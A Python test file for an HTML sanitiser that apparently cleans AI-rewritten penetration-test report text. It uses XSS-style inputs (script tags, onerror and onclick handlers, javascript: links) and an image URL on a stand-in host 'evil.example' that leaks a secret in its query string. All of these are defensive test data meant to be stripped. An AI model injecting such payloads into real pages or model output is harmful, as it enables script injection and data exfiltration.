from pwndoc_ai.sanitize import image_tags, preserve_images, sanitize_html, to_rich_text

IMG = '<img src="0123456789abcdef01234567" alt="1.burp.png">'


def test_scripts_and_handlers_removed():
    dirty = '<p onclick="x()">hi</p><script>alert(1)</script><b>ok</b>'
    out = sanitize_html(dirty)
    assert "script" not in out and "onclick" not in out and "alert" not in out
    assert out == "<p>hi</p><b>ok</b>"


def test_javascript_links_dropped_but_text_kept():
    out = sanitize_html('<a href="javascript:alert(1)">click</a>')
    assert "javascript" not in out
    assert "click" in out


def test_https_links_kept_with_rel():
    out = sanitize_html('<a href="https://cwe.mitre.org/data/79.html">CWE</a>')
    assert 'href="https://cwe.mitre.org/data/79.html"' in out
    assert "noopener" in out


def test_img_allows_pwndoc_ids_only():
    assert IMG in sanitize_html(IMG)
    assert "<img" not in sanitize_html('<img src="javascript:x" onerror="y">')
    assert "<img" not in sanitize_html('<img src="data:text/html;base64,AAAA">')


def test_text_is_escaped():
    assert sanitize_html("<p>1 < 2 & 3</p>") == "<p>1 &lt; 2 &amp; 3</p>"


def test_unclosed_tags_are_closed():
    assert sanitize_html("<ul><li>a") == "<ul><li>a</li></ul>"


def test_plain_text_becomes_paragraphs():
    out = to_rich_text("one\nline two\n\nsecond <b>")
    assert out == "<p>one<br>line two</p><p>second &lt;b&gt;</p>"


def test_empty_stays_empty():
    assert to_rich_text("  ") == ""


def test_preserve_images_reappends_dropped_evidence():
    out = preserve_images(f"<p>step 1</p>{IMG}", "<p>rewritten</p>")
    assert IMG in out
    assert out.startswith("<p>rewritten</p>")


def test_preserve_images_no_duplicate_when_kept():
    rewritten = f"<p>new</p>{IMG}"
    assert preserve_images(f"x{IMG}", rewritten) == rewritten


def test_image_tags_map():
    assert list(image_tags(IMG)) == ["0123456789abcdef01234567"]


def test_external_images_are_dropped_to_block_exfiltration():
    out = sanitize_html('<p>x</p><img src="https://evil.example/x?d=secret">')
    assert "<img" not in out and "evil.example" not in out


def test_allowed_image_ids_restrict_model_placed_images():
    other = '<img src="aaaaaaaaaaaaaaaaaaaaaaaa" alt="y">'
    out = sanitize_html(IMG + other, frozenset({"0123456789abcdef01234567"}))
    assert IMG in out and "aaaaaaaaaaaaaaaaaaaaaaaa" not in out


def test_preserve_images_never_copies_a_hostile_original_tag():
    hostile = '<img src="0123456789abcdef01234567" onerror="alert(1)" alt="a">'
    out = preserve_images(hostile, "<p>new</p>")
    assert "onerror" not in out and 'src="0123456789abcdef01234567"' in out


def test_preserve_images_ignores_non_pwndoc_sources():
    assert preserve_images('<img src="https://x.example/a.png">', "<p>new</p>") == "<p>new</p>"
